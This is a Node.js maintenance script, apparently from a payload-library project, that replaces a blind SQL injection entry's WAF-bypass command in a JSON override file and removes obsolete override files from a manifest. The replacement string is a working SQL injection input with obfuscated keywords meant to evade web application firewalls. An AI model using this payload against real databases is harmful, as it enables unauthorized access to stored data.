#!/usr/bin/env node
/** 终态收束：blind waf 补丁并入 p1fix 宿主（同 area.index），删除 sqlifix/sqlifix2 及其 manifest 注册。 */
const fs = require('fs');
const path = require('path');
const { DatabaseSync } = require('node:sqlite');
const ROOT = path.resolve(__dirname, '..');
const CR = p => path.join(ROOT, 'content-review', p);

const db = new DatabaseSync(path.join(ROOT, 'data/payloader.sqlite'), { readOnly: true });
let blind = null;
for (const r of db.prepare('SELECT data FROM payloads').all()) { const p = JSON.parse(r.data); if (p.id === 'sqli2-blind-conditional-time-and-predicate-probes') blind = p; }
db.close();
const OLD = String(blind.wafBypass[0].command);
const NEW = "1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')\n10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)";

const p1Path = CR('payload-command-overrides-p1fix-2026-09.json');
const p1 = JSON.parse(fs.readFileSync(p1Path, 'utf8'));
const entry = p1.entries.find(x => x.id === 'sqli2-blind-conditional-time-and-predicate-probes');
const patch = entry.patches.find(p => p.area === 'wafBypass' && p.index === 0);
patch.expectedCommand = OLD;
patch.command = NEW;
fs.writeFileSync(p1Path, JSON.stringify(p1, null, 2) + '\n');
console.log('p1fix 宿主补丁扩展 ✓（锚行数', OLD.split('\n').length, '）');

fs.rmSync(CR('payload-command-overrides-sqlifix-2026-09.json'), { force: true });
fs.rmSync(CR('payload-command-overrides-sqlifix2-2026-09.json'), { force: true });
const mPath = CR('manifest.json');
const m = JSON.parse(fs.readFileSync(mPath, 'utf8'));
m.payloadCommandOverrideFiles = (m.payloadCommandOverrideFiles || []).filter(f => !f.startsWith('payload-command-overrides-sqlifix'));
delete m.commandOverrideFiles;
fs.writeFileSync(mPath, JSON.stringify(m, null, 2) + '\n');
console.log('sqlifix×2 删除 + manifest 清理 ✓ | 残留文件:', fs.readdirSync(CR('')).filter(f => f.includes('sqlifix')).length);
